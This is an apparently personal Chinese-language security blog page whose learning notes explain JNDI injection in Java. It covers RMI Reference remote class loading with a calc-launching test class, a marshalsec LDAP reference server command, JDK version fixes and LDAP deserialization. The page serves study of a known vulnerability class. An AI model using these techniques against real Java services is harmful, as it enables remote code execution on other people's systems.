@@ -1,0 +1,218 @@
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>关于JNDI | 5LHBr's Blog</title><meta name="author" content="5LHBr"><meta name="copyright" content="5LHBr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前面写了关于rmi的一些事情，下面写一下jndi的一些问题。其实就是按照b站白日梦组长的学习路径来的。 什么是JNDI——JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。JNDI 架构由 API（应用程序编程接口）和 SP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于JNDI">
+<meta property="og:url" content="http://example.com/2023/08/24/%E5%85%B3%E4%BA%8EJNDI/index.html">
+<meta property="og:site_name" content="5LHBr&#39;s Blog">
+<meta property="og:description" content="前面写了关于rmi的一些事情，下面写一下jndi的一些问题。其实就是按照b站白日梦组长的学习路径来的。 什么是JNDI——JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。JNDI 架构由 API（应用程序编程接口）和 SP">
+<meta property="og:locale">
+<meta property="og:image" content="https://5lhbr.github.io/images/20230730161128.jpg">
+<meta property="article:published_time" content="2023-08-24T07:11:14.000Z">
+<meta property="article:modified_time" content="2023-08-25T11:14:31.147Z">
+<meta property="article:author" content="5LHBr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://5lhbr.github.io/images/20230730161128.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/08/24/%E5%85%B3%E4%BA%8EJNDI/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '关于JNDI',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-25 19:14:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="5LHBr's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://5lhbr.github.io/images/20230730161128.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="5LHBr's Blog"><span class="site-name">5LHBr's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">关于JNDI</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-08-24T07:11:14.000Z" title="Created 2023-08-24 15:11:14">2023-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-08-25T11:14:31.147Z" title="Updated 2023-08-25 19:14:31">2023-08-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="关于JNDI"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>前面写了关于rmi的一些事情，下面写一下jndi的一些问题。其实就是按照b站白日梦组长的学习路径来的。</p>
+<p>什么是JNDI——JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。JNDI 架构由 API（应用程序编程接口）和 SPI（服务提供者接口）组成。Java 应用程序使用此 API 来访问各种命名和目录服务。SPI 可以透明地插入各种命名和目录服务，允许使用 JNDI 技术的 API 的 Java 应用程序访问它们的服务。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）</p>
+<h2 id="JNDI功能实现"><a href="#JNDI功能实现" class="headerlink" title="JNDI功能实现"></a>JNDI功能实现</h2><p>前面提到了，支持rmi，我们以rmi来写一个demo，正好用到我们写的demo</p>
+<h5 id="rmi服务端"><a href="#rmi服务端" class="headerlink" title="rmi服务端"></a>rmi服务端</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RemoteObjImpl</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">//        r.bind(&quot;remoteObj&quot;,remoteObj);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="JNDI使用RMI服务——server端"><a href="#JNDI使用RMI服务——server端" class="headerlink" title="JNDI使用RMI服务——server端"></a>JNDI使用RMI服务——server端</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demoJNDIRmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ctx</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        ctx .bind(<span class="string">&quot;remoteObj&quot;</span>,<span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="JNDI使用RMI服务——client端"><a href="#JNDI使用RMI服务——client端" class="headerlink" title="JNDI使用RMI服务——client端"></a>JNDI使用RMI服务——client端</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用JNDI-References进行注入"><a href="#利用JNDI-References进行注入" class="headerlink" title="利用JNDI References进行注入"></a>利用JNDI References进行注入</h2><h3 id="JNDI-rmi动态类加载"><a href="#JNDI-rmi动态类加载" class="headerlink" title="JNDI+rmi动态类加载"></a>JNDI+rmi动态类加载</h3><p>我们这里重点讲一下和RMI反序列化相关的部分。在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。 </p>
+<h6 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h6><p>Reference类表示对存在于命名&#x2F;目录<strong>系统以外</strong>的对象的引用。</p>
+<p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p>
+<p>在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。</p>
+<p>所以Reference怎么用呢。看定义</p>
+<p><img src="/../images/image-20230825145012223.png" alt="image-20230825145012223"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">className：远程加载时所使用的类名；</span><br><span class="line">classFactory：加载的class中需要实例化类的名称；</span><br><span class="line">classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">Reference refObj=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>,<span class="string">&quot;http://127.0.0.1:8884/&quot;</span>);</span><br><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,refObj);</span><br></pre></td></tr></table></figure>
+
+<p>按照上面代码写的样子就就将一个test类封装好，存放在rmi服务中去了。当有客户端通过 <code>lookup(&quot;remoteObj&quot;)</code> 获取远程对象时，获得到一个 <code>Reference</code> 类的存根，由于获取的是一个 <code>Reference</code> 实例，客户端会首先去本地的 <code>CLASSPATH</code> 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <code>http://http://127.0.0.1:8884/test.class</code> 动态加载 <code>classes</code> 并调用 <code>insClassName</code> 的构造函数。简单来说会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； 我们可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果； </p>
+<p>test.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span><span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230825145822162.png" alt="image-20230825145822162"></p>
+<p>那么原理是什么呢。我们调试一下看看。<img src="/../images/image-20230825152841623.png" alt="image-20230825152841623"></p>
+<p><img src="/../images/image-20230825152946586.png" alt="image-20230825152946586"></p>
+<p>发现可以直接创建一个URLClassLoader，用它来加载该类。这样实际上就允许了远程类加载，相当于允许了远程任意代码执行。如果能控制客户端加载一个恶意的Reference，就能在客户端执行任意代码。在jdk8u121之后进行了修复。我们更换jdk版本后发现报错</p>
+<p><img src="/../images/image-20230825153334264.png" alt="image-20230825153334264"></p>
+<p>可以看到是在RegistryContext里对com.sun.jndi.rmi.object.trustURLCodebase这个属性做了校验，<img src="/../images/image-20230825153642829.png" alt="image-20230825153642829"></p>
+<p><img src="/../images/image-20230825153552489.png" alt="image-20230825153552489"></p>
+<p>值得注意的是，他只是jndi的rmi模块进行了验证，而真正出现远程加载的NamingManager.getObjectInstance并没有限制。那么我们的思路自然而然的就到jndi支持的其他协议了。</p>
+<h3 id="JNDI-LDAP动态类加载"><a href="#JNDI-LDAP动态类加载" class="headerlink" title="JNDI+LDAP动态类加载"></a>JNDI+LDAP动态类加载</h3><p>我们调试一下看一下ldap的执行逻辑是什么，这里我是直接用marshalsec来搭建的服务。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8090/#Exploit</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230825171500714.png" alt="image-20230825171500714"></p>
+<p>发现也是最后走到了VersionHelper12第三个loadClass进行远程加载。</p>
+<p><img src="/../images/image-20230825171558113.png" alt="image-20230825171558113"></p>
+<p>这么调用下去的就不一步一步调了。这里最后是在Jdk8u191被修复了。</p>
+<h2 id="JNDI配合反序列化"><a href="#JNDI配合反序列化" class="headerlink" title="JNDI配合反序列化"></a>JNDI配合反序列化</h2><p>在上一篇rmi中已经详细提到过反序列化的点了。同时其中JNDI的rmi实现还是用的java的rmi实现的，所以rmi客户端存在的反序列化点，在jndi中同样会出现。</p>
+<p>rmi服务会调用RegistryImpl_Stub#lookup</p>
+<p><img src="/../images/image-20230825180703391.png" alt="image-20230825180703391"></p>
+<p>两种攻击方式，jrmp和注册中心攻击客户端。这里就不写了。</p>
+<p>我们讲一下ldap存在反序列化。刚刚在远程调用的那一章调试过程中会遇到一个名为LdapCtx的类。我们着重看一下这个类，这个类可以类比RegistryContext，是JNDI基于LDAP实现的核心逻辑类。在里面有一个Obj.decodeObject</p>
+<p><img src="/../images/image-20230825181747013.png" alt="image-20230825181747013"></p>
+<p>这里又多个判断。分别代表三种还原对象的方法，第一种的直接反序列还原对象，后两种情况都返回的是Reference然后还原。</p>
+<p>这不就呼之欲出了，我们直接放恶意类，客户端调用的时候反序列化直接攻击成功。不过需要注意的是</p>
+<p><img src="/../images/image-20230825184024571.png" alt="image-20230825184024571"></p>
+<p>需要使javaSerializedData 属性值不为空只需要在 LDAP 服务器中添加额外属性的记录即可。</p>
+<h2 id="JNDI高版本绕过"><a href="#JNDI高版本绕过" class="headerlink" title="JNDI高版本绕过"></a>JNDI高版本绕过</h2><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/%E7%9C%8B%E8%BF%99%E4%B8%AA%E5%90%A7%EF%BC%8C%E4%B8%8D%E6%83%B3%E5%86%99%E4%BA%86%E3%80%82">https://tttang.com/archive/1405/看这个吧，不想写了。</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">5LHBr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/24/%E5%85%B3%E4%BA%8EJNDI/">http://example.com/2023/08/24/%E5%85%B3%E4%BA%8EJNDI/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://5lhbr.github.io/images/20230730161128.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/07/30/%E5%85%B3%E4%BA%8ERmi/" title="关于Rmi"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">关于Rmi</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://5lhbr.github.io/images/20230730161128.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">5LHBr</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">JNDI功能实现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#rmi%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">rmi服务端</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JNDI%E4%BD%BF%E7%94%A8RMI%E6%9C%8D%E5%8A%A1%E2%80%94%E2%80%94server%E7%AB%AF"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">JNDI使用RMI服务——server端</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JNDI%E4%BD%BF%E7%94%A8RMI%E6%9C%8D%E5%8A%A1%E2%80%94%E2%80%94client%E7%AB%AF"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">JNDI使用RMI服务——client端</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8JNDI-References%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">利用JNDI References进行注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-rmi%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.1.</span> <span class="toc-text">JNDI+rmi动态类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Reference%E7%B1%BB"><span class="toc-number">2.1.0.0.1.</span> <span class="toc-text">Reference类</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-LDAP%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.2.</span> <span class="toc-text">JNDI+LDAP动态类加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E9%85%8D%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">JNDI配合反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">JNDI高版本绕过</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/24/%E5%85%B3%E4%BA%8EJNDI/" title="关于JNDI">关于JNDI</a><time datetime="2023-08-24T07:11:14.000Z" title="Created 2023-08-24 15:11:14">2023-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/30/%E5%85%B3%E4%BA%8ERmi/" title="关于Rmi">关于Rmi</a><time datetime="2023-07-30T08:55:50.000Z" title="Created 2023-07-30 16:55:50">2023-07-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/26/hello-world/" title="Hello World">Hello World</a><time datetime="2023-07-26T14:04:50.693Z" title="Created 2023-07-26 22:04:50">2023-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/0202/03/26/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" title="java 反序列化">java 反序列化</a><time datetime="0202-03-26T14:48:12.000Z" title="Created 0202-03-26 22:24:54">0202-03-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 5LHBr</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script 